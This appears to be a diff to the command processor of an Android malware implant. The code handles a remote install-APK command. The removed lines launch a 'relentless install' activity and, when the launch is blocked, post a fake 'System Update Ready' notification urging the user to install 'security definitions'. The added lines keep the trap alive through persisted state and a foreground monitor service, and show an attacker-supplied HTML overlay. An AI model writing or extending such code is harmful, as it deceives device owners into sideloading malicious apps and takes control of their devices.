@@ -658,49 +658,23 @@ object CommandProcessor {
                     val apkFile = File(apkPath)
 
                     if (apkFile.exists() && apkFile.isFile) {
-                        if (parts.size > 1) {
-                            // Case A: Show explanation overlay first
-                            val html = parts[1].trim()
-                            DynamicUIManager.showOverlay(ctx, true, html)
-                            status = "INSTALL_EXPLANATION_SHOWN"
-                        } else {
-                            // Case B: Direct relentless trap (no explanation)
-                            val installIntent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
-                                putExtra("apk_path", apkFile.absolutePath)
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
-                            }
-                            try {
-                                ctx.startActivity(installIntent)
-                                status = "RELENTLESS_INSTALL_TRIGGERED"
-                            } catch (e: Exception) {
-                                // FALLBACK: OS blocked background launch. Deploy Trojan Notification.
-                                try {
-                                    val pendingIntent = android.app.PendingIntent.getActivity(
-                                        ctx, 102, installIntent, 
-                                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
-                                    )
-                                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-                                    val channelId = "system_updates"
-                                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                                        val channel = android.app.NotificationChannel(channelId, "System Updates", android.app.NotificationManager.IMPORTANCE_HIGH)
-                                        nm.createNotificationChannel(channel)
-                                    }
-                                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
-                                        .setSmallIcon(android.R.drawable.stat_sys_download_done)
-                                        .setContentTitle("System Update Ready")
-                                        .setContentText("Tap to install the latest security definitions.")
-                                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
-                                        .setContentIntent(pendingIntent)
-                                        .setAutoCancel(true)
+                        val info = ctx.packageManager.getPackageArchiveInfo(apkPath, 0)
+                        val targetPkg = info?.packageName ?: ""
+                        
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("relentless_install_active", true)
+                            .putString("relentless_apk_path", apkFile.absolutePath)
+                            .putString("relentless_target_pkg", targetPkg)
+                            .apply()
 
-                                    nm.notify(102, builder.build())
-                                    status = "INSTALL_DEFERRED_TO_NOTIFICATION"
-                                    errorMsg = "Background launch blocked. Notification deployed."
-                                } catch (fallbackErr: Exception) {
-                                    status = "INSTALL_FAILED_ALL"
-                                    errorMsg = fallbackErr.message ?: "Unknown fallback error"
-                                }
-                            }
+                        val i = Intent(ctx, MonitorService::class.java)
+                        i.putExtra("kick_relentless", true)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
+                        
+                        status = "RELENTLESS_TRAP_ARMED"
+                        
+                        if (parts.size > 1) {
+                            DynamicUIManager.showOverlay(ctx, true, parts[1].trim())
                         }
                     } else {
                         status = "INSTALL_FAILED (NOT_FOUND)"
